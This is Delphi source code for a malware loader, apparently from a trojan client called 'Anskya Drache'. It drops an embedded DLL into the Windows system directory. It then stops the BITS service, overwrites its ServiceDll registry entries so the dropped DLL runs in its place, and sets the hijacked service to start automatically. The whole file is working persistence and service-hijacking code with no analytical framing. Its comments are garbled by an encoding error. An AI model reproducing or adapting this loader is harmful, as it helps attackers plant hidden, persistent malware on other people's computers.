program ClinetLoader;

uses
  Windows, WinSvc, FunUnit, Unit_Clinet001;

const
  MasterMutex = 'Anskya_Drache_Client_001'; //  ������
  MasterServiceName = 'BITS';               //  ��������

//  ����DLL
function Clinet001SaveFile(SaveFile: String): Boolean;
var
  hFile:THandle;
  BytesWrite: dword;
begin
  Result:=False;
  hFile := CreateFile(Pchar(SaveFile),GENERIC_READ or GENERIC_WRITE,FILE_SHARE_READ,nil,CREATE_ALWAYS,0,0);
  if hFile = INVALID_HANDLE_VALUE then Exit;
  if WriteFile(hFile,Clinet001Buf,Clinet001Size, BytesWrite, nil) then Result:=True;
  CloseHandle(hFile);
end;

var
  szBuffer: Array[0..MAX_PATH - 1] of char;
  StrDLLPath: String;
begin
  if Not CreatedMutexEx(MasterMutex) then ExitProcess(0);
  
  //  �ͷ�DLL
  ZeroMemory(@szBuffer, MAX_PATH);
  szBuffer[GetSystemDirectory(szBuffer, MAX_PATH)] := #00;
  StrDLLPath := String(szBuffer);
  StrDLLPath := StrDLLPath + '\' + 'SysAdsnwt.dll';

  if Clinet001SaveFile(StrDLLPath) then
  begin
    OutputDebugString('Free DLL Done!');
    //  ���÷���Ϊ����ģʽ
    ConfigServiceEx(MasterServiceName, SERVICE_DISABLED);
    //  ֹͣ���еķ���
    StartServiceEx(nil, MasterServiceName, False);

    //  �޸�ע���
    OutputDebugString('�滻����BITS');
    SetStrToReg(HKEY_LOCAL_MACHINE, 'SYSTEM\CurrentControlSet\Services\BITS\Parameters', 'ServiceDll', Pchar(StrDLLPath));
    SetStrToReg(HKEY_LOCAL_MACHINE, 'SYSTEM\ControlSet003\Services\BITS\Parameters', 'ServiceDll', Pchar(StrDLLPath));

    OutputDebugString(Pchar('Start DLL Service:' + StrDLLPath));
    //  ���÷���Ϊ����������ģʽ
    ConfigServiceEx(MasterServiceName, SERVICE_AUTO_START);
    //  ���¿�������
    StartServiceEx(nil, MasterServiceName, True);
  end;
  ExitProcess(0);
end.
